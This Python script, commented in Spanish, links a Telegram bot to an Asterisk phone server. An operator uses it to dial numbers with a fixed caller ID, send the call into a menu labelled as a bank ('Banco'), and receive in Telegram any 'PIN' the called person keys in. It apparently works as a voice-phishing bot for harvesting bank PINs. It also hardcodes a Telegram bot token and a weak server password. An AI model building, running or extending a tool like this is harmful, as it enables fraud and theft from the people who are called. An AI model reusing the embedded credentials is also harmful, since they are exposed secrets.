import asyncio
import logging
from panoramisk import Manager
from pydantic import BaseModel
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Configuración del bot de Telegram
TELEGRAM_TOKEN = "7785556123:AAGOnrh2UshZOwAICaqc1hd_wEt04uKWW-g"
AUTHORIZED_CHAT_IDS = [428655938]  # Chat ID autorizado para recibir eventos

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

IVR_OPTIONS = {
    "1": {"context": "bank_credit", "description": "Banco 🏦"},
    "2": {"context": "customer_service", "description": "Cliente 📞"},
    "3": {"context": "sales", "description": "Ventas 🛒"},
}

# Diccionario para manejar datos temporales del usuario
user_data = {}

# Manager global para conexión persistente
manager = Manager(
    host='localhost',
    port=5038,
    username='python_user',
    secret='admin'
)

class Params(BaseModel):
    channel: str
    ivr: str

async def send_telegram_message(chat_id: int, message: str):
    """Enviar un mensaje a Telegram."""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    await application.bot.send_message(chat_id=chat_id, text=message)

async def initiate_call(params: Params, chat_id: int):
    """Iniciar una llamada a través del AMI de Asterisk."""
    originate_action = {
        'Action': 'Originate',
        'Channel': params.channel,
        'Context': params.ivr,
        'Exten': 's',
        'Priority': 1,
        'CallerID': '<18092000221>',
        'Timeout': 30000,
        'Async': 'false',
    }
    try:
        response = await manager.send_action(originate_action)
        message = f"✅ Llamada iniciada"
        logger.info(message)
        await send_telegram_message(chat_id, message)
    except Exception as e:
        error_message = f"❌ Error: {e}"
        logger.error(error_message)
        await send_telegram_message(chat_id, error_message)

async def hangup_call(channel: str, chat_id: int):
    """Colgar una llamada activa."""
    hangup_action = {
        'Action': 'Hangup',
        'Channel': channel,
    }
    try:
        response = await manager.send_action(hangup_action)
        message = f"📴 Llamada finalizada"
        logger.info(message)
        await send_telegram_message(chat_id, message)
    except Exception as e:
        error_message = f"❌ Error al colgar: {e}"
        logger.error(error_message)
        await send_telegram_message(chat_id, error_message)

async def handle_user_event(manager, event):
    """Manejar eventos clave durante la llamada."""
    event_type = event.Event
    channel = event.get('Channel')
    message = None

    if event_type == 'OriginateResponse' and event.get('Response') == 'Success':
        message = f"📞 Llamada conectada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'Newstate':
        state = event.get('ChannelStateDesc')
        if state == 'Ringing':
            message = f"🔔 Llamando..."
        elif state == 'Up':
            message = f"✅ En llamada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'VarSet' and event.get('Variable') == 'pin':
        pin_value = event.get('Value')
        if pin_value:
            message = f"🔑 PIN: {pin_value}"
            logger.info(message)
    elif event_type == 'Hangup':
        message = f"📴 Llamada terminada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id] = {'step': 'idle'}
            user_data[chat_id].pop('channel', None)

    if message:
        for chat_id in AUTHORIZED_CHAT_IDS:
            try:
                await send_telegram_message(chat_id, message)
            except Exception as e:
                logger.error(f"Error al enviar mensaje: {e}")

async def main_manager():
    """Mantener la conexión persistente con el AMI de Asterisk."""
    try:
        await manager.connect()
        logger.info("Conexión establecida con Asterisk AMI.")

        manager.register_event('OriginateResponse', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('Newstate', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('VarSet', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('Hangup', lambda m, e: asyncio.create_task(handle_user_event(m, e)))

        while True:
            await asyncio.sleep(1)
    except Exception as e:
        logger.error(f"Error en la conexión AMI: {e}")
    finally:
        await manager.close()
        logger.info("Conexión cerrada con Asterisk AMI.")

async def start_call(update, context):
    """Iniciar el proceso de llamada."""
    chat_id = update.effective_chat.id
    if chat_id in AUTHORIZED_CHAT_IDS and user_data.get(chat_id, {}).get('step', 'idle') == 'idle':
        await send_telegram_message(chat_id, "📱 Ingresa el número:")
        user_data[chat_id] = {'step': 'phone'}
    else:
        await send_telegram_message(chat_id, "⚠️ Llamada en curso o sin permisos")

async def hangup(update, context):
    """Colgar la llamada activa."""
    chat_id = update.effective_chat.id
    channel = user_data.get(chat_id, {}).get('channel')
    if channel:
        await hangup_call(channel, chat_id)
        user_data[chat_id] = {'step': 'idle'}
    else:
        await send_telegram_message(chat_id, "❌ No hay llamada activa")

async def handle_message(update, context):
    """Procesar mensajes del usuario."""
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        await send_telegram_message(chat_id, "📞 Usa /call para iniciar")
        return

    step = user_data[chat_id].get('step')
    if step == 'phone':
        phone_number = update.message.text.strip()
        if len(phone_number) < 5:
            channel = f'PJSIP/{phone_number}'
        else:
            channel = f'PJSIP/{phone_number}@callwithus'

        user_data[chat_id]['channel'] = channel
        user_data[chat_id]['step'] = 'ivr'
        options_text = "🔍 Selecciona:\n" + "\n".join(
            [f"{key}. {value['description']}" for key, value in IVR_OPTIONS.items()]
        )
        await send_telegram_message(chat_id, options_text)
    elif step == 'ivr':
        ivr_choice = update.message.text.strip()
        if ivr_choice in IVR_OPTIONS:
            ivr_context = IVR_OPTIONS[ivr_choice]["context"]
            params = Params(channel=user_data[chat_id]['channel'], ivr=ivr_context)
            await send_telegram_message(chat_id, f"📞 Llamando... {IVR_OPTIONS[ivr_choice]['description']}")
            await initiate_call(params, chat_id)
        else:
            await send_telegram_message(chat_id, "⚠️ Opción inválida")

def setup_bot():
    """Configurar y ejecutar el bot de Telegram."""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("call", start_call))
    application.add_handler(CommandHandler("hangup", hangup))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return application

def main():
    """Correr el bot y el loop principal."""
    application = setup_bot()
    loop = asyncio.get_event_loop()

    loop.create_task(main_manager())
    application.run_polling()

if __name__ == "__main__":
    main()